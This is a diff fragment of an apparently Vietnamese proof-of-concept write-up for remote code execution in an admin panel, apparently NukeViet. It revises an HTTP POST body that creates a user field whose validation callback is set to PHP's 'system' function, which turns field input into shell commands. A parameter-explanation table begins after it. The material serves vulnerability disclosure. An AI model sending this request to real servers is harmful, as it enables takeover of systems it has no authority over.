@@ -185,8 +185,10 @@ Referer: http://127.0.0.1:8080/admin/index.php?nv=users&op=fields
 Cookie: <cookie>
 Connection: keep-alive
 
-field=0&title=PoC%2BRCE&description=PoC&show_register=1&user_editable=1&show_profile=1&field_type=textbox&class=input&editor_width=100%25&editor_height=100px&match_type=none&default_value=&min_length=0&max_length=255&number_type=1&default_value_number=0&min_number_length=0&max_number_length=1000&current_date=0&default_date=&min_date=&max_date=&choicetypes=field_choicetypes_sql&field_choice%5B1%5D=&field_choice_text%5B1%5D=&system=0&fid=&fieldid=&save=1
+save=1&fid=0&system=0&title=PoC+RCE&description=PoC&required=0&show_register=1&user_editable=1&show_profile=1&class=&field_type=textbox&field=nv_poc_rce&match_type=callback&match_callback=system&min_length=0&max_length=100&default_value=
 ```
+
+
 
 | Tham số          | Giá trị      | Vì sao                                                                                                                                                                     |
 | ---------------- | ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
